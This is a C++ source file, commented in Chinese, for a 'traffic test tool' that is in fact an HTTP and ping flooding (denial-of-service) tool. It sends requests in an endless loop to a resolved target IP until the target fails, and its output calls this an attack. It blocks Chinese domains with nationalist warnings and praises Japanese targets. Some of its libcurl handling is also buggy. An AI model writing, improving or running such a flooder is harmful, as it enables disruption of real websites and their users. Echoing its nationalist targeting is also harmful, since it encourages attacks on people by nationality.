/**
 * 网络流量测试工具实现文件
 *
 * 功能说明：
 * 1. 支持HTTP和PING两种测试模式
 * 2. 自动检测和过滤中国域名
 * 3. 支持域名解析为IP地址
 * 4. 提供详细的请求响应信息
 * 5. 包含测试模式和正常模式
 *
 * 安全特性：
 * 1. 内置中国域名保护机制
 * 2. 请求超时保护
 * 3. 错误处理和恢复机制
 *
 * 作者：钟智强
 * 版本：1.0.0
 * 最后更新：2024-01
 */

#include "TrafficFlood.h"

#include "PingFlood.h"

/**
 * libcurl库
 * 用于执行HTTP请求和网络操作
 */
#include <curl/curl.h>

/**
 * C++标准库依赖
 * chrono: 时间相关操作
 * iomanip: 输出格式控制
 * iostream: 标准输入输出
 * thread: 线程操作
 */
#include <chrono>
#include <iomanip>
#include <iostream>
#include <thread>

/**
 * 全局配置变量
 * isTest: 测试模式开关
 *   - true:  仅发送3次请求，用于功能验证
 *   - false: 持续发送请求直到失败，用于实际测试
 *
 * isPing: PING测试开关
 *   - true:  同时发送HTTP请求和PING请求
 *   - false: 仅发送HTTP请求
 */
bool isTest = false;
bool isPing = false;

/**
 * cURL响应数据处理回调函数
 *
 * 工作流程：
 * 1. 接收服务器返回的数据块
 * 2. 将数据追加到输出缓冲区
 * 3. 返回实际处理的数据大小
 *
 * @param contents 服务器返回的数据块指针
 * @param size     单个数据项的大小
 * @param nmemb    数据项的数量
 * @param output   输出缓冲区指针
 * @return         实际处理的总字节数
 */
size_t WriteCallback(void* contents, size_t size, size_t nmemb,
                     std::string* output) {
    size_t totalSize = size * nmemb;
    output->append((char*)contents, totalSize);
    return totalSize;
}

/**
 * 进度显示动画
 *
 * 特性：
 * 1. 使用Unicode字符实现平滑动画效果
 * 2. 支持自定义提示信息
 * 3. 自动循环播放
 * 4. 不影响其他输出
 *
 * @param message 要显示的提示文本
 */
void showSpinner(const std::string& message) {
    static const char spinner[] = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏";
    static int i = 0;
    std::cout << "\r" << spinner[i++ % 10] << " " << message << std::flush;
}

/**
 * 清除当前行输出
 */
void clearLine() { std::cout << "\r\033[K" << std::flush; }

/**
 * 流量发送主函数
 *
 * 执行流程：
 * 1. 检查目标域名是否为受保护的中国域名
 * 2. 将域名解析为IP地址
 * 3. 规范化URL格式
 * 4. 根据测试模式选择执行策略
 * 5. 发送HTTP请求和可选的PING请求
 * 6. 实时显示执行进度和结果
 *
 * @param url 目标网址
 */
void TrafficFlood::Flood(std::string url) {
    if (url.find(".cn") != std::string::npos ||
        url.find(".中国") != std::string::npos ||
        url.find(".xin") != std::string::npos ||
        url.find(".公司") != std::string::npos ||
        url.find(".网络") != std::string::npos ||
        url.find(".gov.cn") != std::string::npos ||
        url.find(".org.cn") != std::string::npos ||
        url.find(".com.cn") != std::string::npos ||
        url.find(".net.cn") != std::string::npos ||
        url.find(".edu.cn") != std::string::npos ||
        url.find(".mil.cn") != std::string::npos) {
        std::cout << "\033[31m|> 流量攻击已被禁用\033[0m" << std::endl;
        std::cout << "\033[31m|> 中国人不攻击中国人，你知道吗？\033[0m"
                  << std::endl;
        std::cout << "\033[31m|> "
                     "我们是中国人，绝不攻击自己的同胞！这是不可触碰的底线，你"
                     "明白吗？\033[0m"
                  << std::endl;
        std::cout
            << "\033[31m|> "
               "任何试图违背这一原则的行为，都将被视为对整个社区的威胁！\033[0m"
            << std::endl;
        std::cout << "\033[31m|> "
                     "系统已启动最高级别监控，任何违规行为都将被记录并受到最严"
                     "厉的制裁！\033[0m"
                  << std::endl;
        std::cout
            << "\033[31m|> "
               "请立即停止一切不当行为，否则你将承担不可挽回的后果！\033[0m"
            << std::endl;
        std::cout
            << "\033[31m|> "
               "这是最后的警告，希望你能清楚地认识到自己的行为后果！\033[0m"
            << std::endl;
    } else {
        if (url.find(".jp") != std::string::npos) {
            std::cout << "\033[31m|> 好样的！\033[0m" << std::endl;
        }

        int counter = 0;

        std::string ip = URL_TO_IP(url);

        if (url.find("://") == std::string::npos) url = "http://" + url;

        std::cout << "\033[1m|> 正在发送流量到目标: " << url + "#" + ip
                  << "\033[0m" << std::endl;

        if (isTest) {
            while (counter < 3) {
                for (int i = 0; i < 10; i++) {
                    showSpinner("第 " + std::to_string(counter + 1) +
                                " 次请求中...");
                    std::this_thread::sleep_for(std::chrono::milliseconds(1));
                }
                clearLine();
                std::cout << "\033[32m|> 第 " << (counter + 1)
                          << " 次请求开始\033[0m" << std::endl;
                if (HttpRequest(ip) != 0) {
                    std::cout << "\033[31m|> 请求失败，停止攻击\033[0m"
                              << std::endl;
                    break;
                } else {
                    HttpRequest(ip);

                    if (isPing) {
                        PingFlood::SendPing(ip);
                    }
                }

                counter++;
            }
        } else {
            while (true) {
                for (int i = 0; i < 1000; i++) {
                    showSpinner("第 " + std::to_string(counter) +
                                " 次请求中...");
                    std::this_thread::sleep_for(std::chrono::milliseconds(1));
                }

                clearLine();

                std::cout << "\033[32m|> 第 " << counter << " 次请求开始\033[0m"
                          << std::endl;

                if (HttpRequest(ip) != 0 && !PingFlood::SendPing(ip)) {
                    std::cout << "\033[31m|> 请求失败，停止攻击\033[0m"
                              << std::endl;
                    break;
                } else {
                    HttpRequest(ip);

                    if (isPing) {
                        PingFlood::SendPing(ip);
                    }
                }

                counter++;
            }
        }
    }
}

/**
 * HTTP请求发送函数
 *
 * 功能特性：
 * 1. 自动初始化cURL会话
 * 2. 配置请求参数和回调函数
 * 3. 执行请求并处理响应
 * 4. 提供详细的响应信息显示
 * 5. 自动清理资源
 *
 * 响应信息包括：
 * - HTTP状态码
 * - 内容类型
 * - Cookie信息
 * - 错误信息（如果有）
 *
 * @param url 目标URL
 * @return 0表示成功，1表示失败
 */
int TrafficFlood::HttpRequest(std::string url) {
    CURL* curl = curl_easy_init();

    if (!curl) {
        std::cerr << "cURL 初始化失败！" << std::endl;
        return 1;
    }

    std::string response;

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        std::cerr << "\033[31m|> cURL 请求失败: " << curl_easy_strerror(res)
                  << "\033[0m" << std::endl;

        return 1;
    } else {
        struct curl_slist* headers = NULL;
        res = curl_easy_getinfo(curl, CURLINFO_COOKIELIST, &headers);

        std::cout << "\n\033[1m|> 响应信息表:\033[0m\n";
        std::cout
            << "\033[36m+-----------------+------------------------+\033[0m\n";
        std::cout
            << "\033[36m| 类型           | 值                     |\033[0m\n";
        std::cout
            << "\033[36m+-----------------+------------------------+\033[0m\n";

        long response_code;

        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        std::cout << "| 状态码         | " << response_code
                  << std::setw(22 - std::to_string(response_code).length())
                  << "|\n";

        char* content_type;

        curl_easy_getinfo(curl, CURLINFO_CONTENT_TYPE, &content_type);

        if (content_type) {
            std::cout << "| 内容类型       | " << content_type
                      << std::setw(22 - strlen(content_type)) << "|\n";
        }

        if (headers) {
            std::cout << "| Cookie         | ";

            struct curl_slist* curr = headers;
            bool first = true;

            while (curr) {
                if (!first) std::cout << "                | ";

                std::cout << curr->data << std::setw(22 - strlen(curr->data))
                          << "|\n";
                first = false;

                curr = curr->next;
            }
            curl_slist_free_all(headers);
        }

        std::cout
            << "\033[36m+-----------------+------------------------+\033[0m\n";

        return 0;
    }

    curl_easy_cleanup(curl);

    return 0;
}

/**
 * 将URL转换为IP地址
 *
 * 解析步骤：
 * 1. 初始化cURL会话
 * 2. 清理URL格式（移除协议前缀和路径）
 * 3. 执行DNS解析
 * 4. 提取IP地址
 * 5. 清理资源
 *
 * 错误处理：
 * - 如果解析失败，返回原始URL
 * - 自动处理各种URL格式
 *
 * @param url 输入的URL
 * @return 解析得到的IP地址或原始URL
 */
std::string TrafficFlood::URL_TO_IP(std::string url) {
    CURL* curl = curl_easy_init();
    struct curl_slist* dns;
    std::string ip;

    if (curl) {
        size_t pos = url.find("://");

        if (pos != std::string::npos) url = url.substr(pos + 3);

        pos = url.find("/");

        if (pos != std::string::npos) url = url.substr(0, pos);

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_RESOLVE, &dns);

        CURLcode res = curl_easy_perform(curl);
        if (res == CURLE_OK) {
            char* ip_address;
            res = curl_easy_getinfo(curl, CURLINFO_PRIMARY_IP, &ip_address);

            if (res == CURLE_OK && ip_address) {
                ip = std::string(ip_address);
            }
        }

        curl_easy_cleanup(curl);
    }

    return ip.empty() ? url : ip;
}

/**
 * URL可访问性检查函数
 *
 * 检查方法：
 * 1. 发送HEAD请求（仅获取头信息）
 * 2. 设置5秒超时限制
 * 3. 允许自动跟随重定向
 * 4. 分析HTTP状态码
 *
 * 状态码判断：
 * - 2xx: 成功
 * - 3xx: 重定向（自动处理）
 * - 4xx/5xx: 失败
 *
 * @param url 要检查的URL
 * @return true表示可访问，false表示不可访问
 */
bool TrafficFlood::IsURLExist(std::string url) {
    CURL* curl = curl_easy_init();
    if (!curl) return false;

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

    CURLcode res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        curl_easy_cleanup(curl);
        return false;
    }

    long response_code;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
    curl_easy_cleanup(curl);

    return (response_code >= 200 && response_code < 400);
}